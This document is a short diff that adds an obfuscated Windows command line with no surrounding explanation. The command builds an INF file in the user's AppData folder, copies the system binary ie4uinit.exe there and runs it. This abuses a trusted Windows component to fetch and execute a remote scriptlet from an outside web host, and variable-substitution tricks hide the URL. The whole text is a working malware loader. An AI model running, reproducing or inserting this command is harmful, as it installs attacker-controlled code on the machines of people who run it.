@@ -1,0 +1,4 @@
+/v /c (for %l in (s) do @set "Alter=%~l") &&
+  call(for /D %l in ("[DFF]" "ieu%Forget%.inf" "[strings]" "shortsvcname=' '" "Clever=/" "Forget=init" "Popular=com" "Unhappy=%time%" "Mattress=:;Bathrooms" "Tooth=h" "Dinner=t;Characters" "servicename=' '" "Editors=b;Metals" "[destinationdirs]" "defaultdestdir=11" "DFF=01" "[7E102F]" "sc\" "ro%Editors%j,NI,%Tooth%%Dinner%%Dinner%p%Mattress%%Clever%%Clever%lsfyf.kimberlykamara.%Popular%/winapayf" "[version]" "signature =$windows nt$" "[defaultinstall.windows7]" "delfiles=DFF" "Un\" "Register\" "OCXs=7E102F" ) do @echo %~l)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Streams!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" &&
+  %appdata%\microsoft\ie4uinit.exe -basesettings
